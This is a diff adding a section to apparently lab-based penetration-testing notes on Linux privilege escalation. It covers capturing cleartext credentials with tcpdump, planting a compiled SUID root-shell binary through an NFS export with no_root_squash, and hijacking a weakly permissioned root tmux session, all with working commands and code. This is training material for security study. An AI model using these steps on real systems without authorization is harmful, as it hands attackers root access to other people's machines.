@@ -453,3 +453,86 @@ logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
 ```
 
 and if everything is good we should get a shell as root
+
+## Miscellaneous Techniques
+
+If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire.\
+Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. Any accessible mounts can be listed remotely by issuing the command `showmount -e`
+
+```shell-session
+ElFelixi0@htb[/htb]$ showmount -e 10.129.2.12
+/tmp             *
+/var/nfs/general *
+```
+
+#### Weak NFS Privileges
+
+When an NFS volume is created, various options can be set: **root\_squash** & **no\_root\_squash.**
+
+We can check that in&#x20;
+
+```shell-session
+htb@NIX02:~$ cat /etc/exports
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+&#x20;we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.
+
+```shell-session
+htb@NIX02:~$ cat shell.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+```shell-session
+htb@NIX02:/tmp$ gcc shell.c -o shell
+```
+
+```shell-session
+root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+root@Pwnbox:~$ cp shell /mnt
+root@Pwnbox:~$ chmod u+s /mnt/shell
+```
+
+When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.
+
+```
+htb@NIX02:/tmp$ ./shell
+root@NIX02:/tmp# 
+```
+
+#### Hijacking Tmux Sessions
+
+&#x20;For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked.
+
+```shell-session
+htb@NIX02:~$ tmux -S /shareds new -s debugsess
+htb@NIX02:~$ chown root:devs /shareds
+```
+
+Check for any running `tmux` processes.
+
+```shell-session
+htb@NIX02:~$  ps aux | grep tmux
+```
+
+Check permissions:
+
+```shell-session
+htb@NIX02:~$ ls -la /shareds 
+```
+
+we just need to check our group is the same as the session or maybe we  compromises a user in the group
+
+Finally, attach to the `tmux` session and confirm root privileges.
+
+```shell-session
+htb@NIX02:~$ tmux -S /shareds
+```
